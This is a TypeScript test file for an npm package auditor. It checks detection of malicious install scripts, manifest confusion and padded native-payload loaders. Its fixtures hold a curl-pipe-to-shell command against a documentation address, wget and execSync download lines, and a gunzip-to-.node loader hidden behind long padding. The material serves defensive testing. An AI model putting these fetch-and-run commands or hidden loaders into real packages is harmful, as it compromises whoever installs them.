import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { test, describe } from "node:test";
import { gzipSync } from "node:zlib";
import { promisify } from "node:util";
import { auditTarball, runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core review round 5: raw header path on win32 hosts, quote spans on raw words,
// non-shell inline code operands, extension-less require of a written .node.

const run = promisify(execFile);
const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };

function tarBytes(entries: { name: string; data: string }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data, "latin1");
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write("0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}
const pkg = (extra: object = {}) => JSON.stringify({ name: "demo", version: "1.0.0", ...extra });

describe("backslash readings survive a win32 audit host", () => {
  // Honest on darwin: node-tar reads TESTING_TAR_FAKE_PLATFORM, so a child process with it set runs the
  // REAL win32 normalization (`\` -> `/` in entry.path) rather than a simulation of it.
  const confusionIn = async (platform: string | undefined): Promise<string[]> => {
    const tarball = tarBytes([
      { name: "package/package.json", data: pkg() },
      { name: "a\\b/package.json", data: pkg({ scripts: { postinstall: CURL_SH } }) },
    ]);
    const code = `import { extractTarball } from ${JSON.stringify(new URL("../src/index.ts", import.meta.url).href)};
const r = await extractTarball(Buffer.from(process.argv[1], "base64"));
console.log(JSON.stringify(r.manifestConfusion));`;
    const env = { ...process.env } as Record<string, string>;
    delete env.TESTING_TAR_FAKE_PLATFORM;
    if (platform) env.TESTING_TAR_FAKE_PLATFORM = platform;
    const { stdout } = await run(process.execPath, ["--import", "tsx", "--input-type=module", "-e", code, tarball.toString("base64")], { env });
    return JSON.parse(stdout.trim().split("\n").pop()!);
  };

  test("`a\\b/package.json` next to a real manifest is manifest-confusion under both platforms", async () => {
    assert.ok((await confusionIn(undefined)).length > 0, "host platform");
    assert.ok((await confusionIn("win32")).length > 0, "win32 node-tar normalization");
  });
});

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, cmd: string): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify({ scripts: { postinstall: cmd } })));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const crit = (files: Record<string, string>, cmd: string) =>
  runRules(inputFor(files, cmd)).filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");

describe("inline code quote spans are found on the raw words", () => {
  test("`bash -c 'node evil && echo done'` flags the extension-less evil", () => {
    assert.equal(crit({ "package/evil": `${CURL_SH}\n` }, "bash -c 'node evil && echo done'").length, 1);
    assert.equal(crit({ "package/evil": `${CURL_SH}\n` }, 'bash -c "node evil; echo done"').length, 1);
  });

  test("a missing closing quote skips only the one code word and keeps scanning", () => {
    assert.equal(crit({ "package/evil.sh": `${CURL_SH}\n` }, "sh -c 'echo hi evil.sh").length, 1);
  });

  test("a quoted separator does not split the command, and benign code stays clean", () => {
    assert.equal(crit({ "package/README": "docs\n" }, "sh -c 'echo a && echo b'").length, 0);
  });
});

describe("non-shell inline code still resolves code-extension names", () => {
  test("`node -e \"require('./evil.js')\"` scans evil.js", () => {
    const f = crit({ "package/evil.js": "require('child_process').execSync('curl x')\nwget x\n" }, `node -e "require('./evil.js')"`);
    assert.equal(f.length, 1);
    assert.match(f[0]!.message, /downloads from the network/, "evil.js content must contribute");
  });

  test("`python3 -c \"exec(open('evil.py').read())\"` scans evil.py", () => {
    const f = crit({ "package/evil.py": "wget http://198.51.100.1/x\n" }, `python3 -c "exec(open('evil.py').read())"`);
    assert.equal(f.length, 1);
    assert.match(f[0]!.message, /downloads from the network/);
  });
});

describe("overflow fallback: extension-less require of a written .node", () => {
  test("pad + write(...'output.node') and require('./output') stays critical and blocks", async () => {
    const chain = `
const fs=require('fs'),zlib=require('zlib'),path=require('path');
const c=fs.readFileSync(path.join(__dirname,'intro.bin'));
fs.writeFileSync(path.join(__dirname,'output.node'),zlib.gunzipSync(c));
require('./output');`;
    const pad = `${"(".repeat(100000)}x${")".repeat(100000)};\n`;
    const report = await auditTarball({
      meta,
      tarball: tarBytes([
        { name: "package/package.json", data: pkg({ main: "index.js" }) },
        { name: "package/index.js", data: pad + chain },
      ]),
    });
    assert.ok(report.findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"));
    assert.equal(report.verdict, "block");
  });

  test("same fixture with only the write target changed (not .node) is not critical", async () => {
    const chain = `
const fs=require('fs'),zlib=require('zlib'),path=require('path');
const c=fs.readFileSync(path.join(__dirname,'intro.bin'));
fs.writeFileSync(path.join(__dirname,'output.bin'),zlib.gunzipSync(c));
require('./output');`;
    const pad = `${"(".repeat(100000)}x${")".repeat(100000)};\n`;
    const report = await auditTarball({
      meta,
      tarball: tarBytes([
        { name: "package/package.json", data: pkg({ main: "index.js" }) },
        { name: "package/index.js", data: pad + chain },
      ]),
    });
    const hits = report.findings.filter((f) => f.ruleId === "native-payload-loader");
    assert.ok(hits.some((f) => f.severity === "high"), "the fallback still fires (read + decode + write)");
    assert.ok(!hits.some((f) => f.severity === "critical"), "an extension-less require without a .node write must not count as a launch");
  });
});
